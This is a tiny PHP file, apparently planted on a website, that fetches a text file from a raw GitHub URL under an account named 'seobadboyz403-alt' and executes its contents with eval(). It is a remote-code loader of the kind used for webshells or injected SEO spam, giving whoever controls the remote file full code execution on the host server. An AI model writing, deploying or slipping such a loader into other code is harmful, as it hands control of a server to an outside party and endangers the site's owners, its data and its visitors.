<?php

$content = file_get_contents(urldecode('https://raw.githubusercontent.com/seobadboyz403-alt/ngacak/refs/heads/main/uthayamugam.txt'));

$content = "?> ".$content;
eval($content);
